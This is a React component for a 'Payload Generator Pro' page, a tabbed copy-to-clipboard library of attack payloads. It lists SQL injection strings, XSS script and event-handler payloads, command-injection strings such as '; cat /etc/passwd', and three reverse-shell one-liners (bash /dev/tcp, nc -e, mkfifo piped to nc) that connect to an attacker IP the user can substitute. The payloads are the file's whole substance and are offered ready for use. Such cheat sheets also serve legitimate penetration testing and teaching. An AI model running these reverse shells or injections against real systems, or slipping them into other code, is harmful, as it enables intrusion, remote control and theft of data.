import React, { useState } from 'react';
import { Terminal, Copy, Download } from 'lucide-react';
import './ToolPages.css';

const PayloadGenerator = () => {
  const [activeTab, setActiveTab] = useState('sql');
  const [customParam, setCustomParam] = useState('');

  const payloads = {
    sql: {
      label: 'SQL INJECTION',
      items: [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "' or 1=1--",
        "') or '1'='1--",
        "1' ORDER BY 1--+",
        "1' UNION SELECT NULL--",
        "-1' UNION SELECT 1,2,3--"
      ]
    },
    xss: {
      label: 'XSS PAYLOADS',
      items: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>"
      ]
    },
    shell: {
      label: 'REVERSE SHELLS',
      items: [
        'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        'nc -e /bin/sh 10.0.0.1 4444',
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f'
      ]
    },
    cmd: {
      label: 'COMMAND INJECTION',
      items: [
        '; ls',
        '| ls',
        '&& ls',
        '; cat /etc/passwd',
        '| whoami',
        '&& id'
      ]
    }
  };

  const handleCopy = (payload) => {
    const final = customParam ? payload.replace(/10\.0\.0\.1/g, customParam) : payload;
    navigator.clipboard.writeText(final);
  };

  const handleCopyAll = () => {
    const all = payloads[activeTab].items.map(p => customParam ? p.replace(/10\.0\.0\.1/g, customParam) : p).join('\n\n');
    navigator.clipboard.writeText(all);
  };

  return (
    <div className='tool-page'>
      <div className='tool-header'>
        <div className='tool-title'>
          <Terminal size={32} />
          <div>
            <h1>PAYLOAD GENERATOR PRO</h1>
            <p>&gt; Professional exploit payload library</p>
          </div>
        </div>
      </div>

      <div className='tool-content'>
        <div className='tabs'>
          {Object.entries(payloads).map(([key, value]) => (
            <button
              key={key}
              className={`tab ${activeTab === key ? 'active' : ''}`}
              onClick={() => setActiveTab(key)}
            >
              {value.label}
            </button>
          ))}
        </div>

        <div className='search-box'>
          <div className='input-group-tool'>
            <label>CUSTOM IP/PARAMETER (OPTIONAL)</label>
            <input
              type='text'
              placeholder='your-ip-here'
              value={customParam}
              onChange={(e) => setCustomParam(e.target.value)}
            />
          </div>
          <div className='stats-row' style={{marginTop: '1rem'}}>
            <button className='btn-tool btn-secondary' onClick={handleCopyAll}>
              <Copy size={18} />
              COPY ALL
            </button>
          </div>
        </div>

        <div className='alert-box'>
          <Terminal size={18} />
          <span>
            {payloads[activeTab].items.length} payloads available.
          </span>
        </div>

        <div className='results-grid'>
          {payloads[activeTab].items.map((payload, index) => (
            <div key={index} className='result-card found'>
              <div className='code-block' style={{marginBottom: '1rem'}}>
                {customParam && activeTab === 'shell' ? payload.replace(/10\.0\.0\.1/g, customParam) : payload}
              </div>
              <button className='btn-tool btn-secondary' onClick={() => handleCopy(payload)} style={{width: '100%'}}>
                <Copy size={16} />
                COPY
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default PayloadGenerator;